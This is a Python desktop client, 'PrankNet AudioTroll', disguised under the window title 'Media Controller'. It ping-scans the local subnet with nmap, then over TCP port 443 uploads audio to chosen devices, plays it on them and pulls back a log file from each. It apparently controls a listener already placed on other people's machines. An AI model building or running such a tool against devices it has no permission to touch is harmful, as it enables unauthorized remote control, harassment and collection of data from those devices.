import platform
from venv import logger
import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import socket
import os
import subprocess
import nmap

# Настройки клиента
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")
PORT = 443

class PrankClient:
    def __init__(self, root):
        self.root = root
        self.root.title("Media Controller")
        self.root.geometry("600x500")
        self.devices = []

        # Локальный IP
        self.local_ip = socket.gethostbyname(socket.gethostname())

        # Основной фрейм с градиентом
        self.main_frame = ctk.CTkFrame(self.root, corner_radius=10)
        self.main_frame.pack(padx=20, pady=20, fill="both", expand=True)

        # Заголовок
        ctk.CTkLabel(
            self.main_frame, text="PrankNet AudioTroll", font=("Arial", 24, "bold")
        ).pack(pady=10)

        # Локальный IP
        ctk.CTkLabel(
            self.main_frame, text=f"Локальный IP: {self.local_ip}", font=("Arial", 14)
        ).pack(pady=5)

        # Поле для порта
        ctk.CTkLabel(self.main_frame, text="Порт:", font=("Arial", 12)).pack()
        self.port_entry = ctk.CTkEntry(self.main_frame, width=100, placeholder_text="443")
        self.port_entry.insert(0, str(PORT))
        self.port_entry.pack(pady=5)

        # Кнопка сканирования
        self.scan_button = ctk.CTkButton(
            self.main_frame,
            text="Сканировать сеть",
            command=self.scan_network,
            corner_radius=8,
            fg_color="#4CAF50",
            hover_color="#FFFFFF",
        )
        self.scan_button.pack(pady=10)

        # Таблица устройств
        self.device_listbox = ctk.CTkTextbox(self.main_frame, height=150, width=300)
        self.device_listbox.pack(pady=10)
        self.device_listbox.configure(state="disabled")

        self.control_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.control_frame.pack(pady=10)

        self.upload_button = ctk.CTkButton(
            self.control_frame,
            text="Выгрузить звук",
            command=self.upload_sound,
            corner_radius=8,
            fg_color="#2196F3",
            hover_color="#FFFFFF",
            state="disabled",
        )
        self.upload_button.pack(side="left", padx=5)

        self.play_button = ctk.CTkButton(
            self.control_frame,
            text="Воспроизвести звук",
            command=self.play_sound,
            corner_radius=8,
            fg_color="#9C27B0",
            hover_color="#FFFFFF",
            state="disabled",
        )
        self.play_button.pack(side="left", padx=5)

        self.log_button = ctk.CTkButton(
            self.control_frame,
            text="Получить лог-файл",
            command=self.get_log_file,
            corner_radius=8,
            fg_color="#FF9800",
            hover_color="#FFFFFF",
            state="disabled",
        )
        self.log_button.pack(side="left", padx=5)

        self.animate_buttons()

    def animate_buttons(self):
        def pulse(button, color, hover_color):
            button.configure(fg_color=hover_color)
            self.root.after(500, lambda: button.configure(fg_color=color))
            self.root.after(1000, lambda: pulse(button, color, hover_color))

        if self.upload_button.cget("state") == "normal":
            pulse(self.upload_button, "#2196F3", "#FFFFFF")
        if self.play_button.cget("state") == "normal":
            pulse(self.play_button, "#9C27B0", "#FFFFFF")
        if self.log_button.cget("state") == "normal":
            pulse(self.log_button, "#FF9800", "#FFFFFF")
        self.root.after(1000, self.animate_buttons)

    def scan_network(self):
        nm = nmap.PortScanner()
        nm.scan(hosts="192.168.1.0/24", arguments="-sn")
        self.devices = []
        self.device_listbox.configure(state="normal")
        self.device_listbox.delete("1.0", tk.END)

        for host in nm.all_hosts():
            if nm[host]["status"]["state"] == "up":
                self.devices.append(host)
                self.device_listbox.insert(tk.END, f"{host}\n")

        self.device_listbox.configure(state="disabled")
        state = "normal" if self.devices else "disabled"
        self.upload_button.configure(state=state)
        self.play_button.configure(state=state)
        self.log_button.configure(state=state)

    def upload_sound(self):
        filepath = filedialog.askopenfilename(filetypes=[("Аудио файлы", "*.mp3 *.wav")])
        if not filepath:
            return

        filename = os.path.basename(filepath)
        filesize = os.path.getsize(filepath)
        selected_ip = self.get_selected_ip()
        if not selected_ip:
            messagebox.showerror("Ошибка", "Выберите устройство!")
            return

        try:
            port = int(self.port_entry.get()) if self.port_entry.get() else PORT
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((selected_ip, port))
            sock.send(f"UPLOAD:{filename}:{filesize}".encode())
            with open(filepath, "rb") as f:
                while chunk := f.read(1024):
                    sock.send(chunk)
            messagebox.showinfo("Успех", f"Звук загружен на {selected_ip}")
            sock.close()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось загрузить: {e}")

    def play_sound(self):
        selected_ip = self.get_selected_ip()
        if not selected_ip:
            messagebox.showerror("Ошибка", "Выберите устройство!")
            return

        filename = ctk.CTkInputDialog(
            title="Воспроизвести звук",
            text="Введите имя файла (например, rickroll.mp3):",
        ).get_input()
        if not filename:
            return

        try:
            port = int(self.port_entry.get()) if self.port_entry.get() else PORT
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((selected_ip, port))
            sock.send("PLAY".encode())
            sock.send(filename.encode())
            messagebox.showinfo("Успех", f"Играет {filename} на {selected_ip}")
            sock.close()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось воспроизвести: {e}")

    def get_log_file(self):
        selected_ip = self.get_selected_ip()
        if not selected_ip:
            messagebox.showerror("Ошибка", "Выберите устройство!")
            return

        try:
            port = int(self.port_entry.get()) if self.port_entry.get() else PORT
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((selected_ip, port))
            sock.send("GET_LOG".encode())
            log_size = int(sock.recv(1024).decode())
            if log_size == 0:
                messagebox.showinfo("Инфо", "Лог-файл пуст или отсутствует")
                sock.close()
                return

            log_data = b""
            while len(log_data) < log_size:
                chunk = sock.recv(1024)
                log_data += chunk

            log_filename = f"log_from_{selected_ip}.txt"
            with open(log_filename, "wb") as f:
                f.write(log_data)
            logger.info(f"Лог сохранен как {log_filename}")

            # Открываем лог в текстовом редакторе
            if platform.system() == "Windows":
                os.startfile(log_filename)
            else:
                subprocess.run(["xdg-open", log_filename])

            messagebox.showinfo("Успех", f"Лог сохранен как {log_filename} и открыт")
            sock.close()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось получить лог: {e}")

    def get_selected_ip(self):
        cursor_pos = self.device_listbox.index(tk.INSERT)
        line_num = int(cursor_pos.split(".")[0]) - 1
        if 0 <= line_num < len(self.devices):
            return self.devices[line_num]
        return None

if __name__ == "__main__":
    root = ctk.CTk()
    app = PrankClient(root)
    root.mainloop()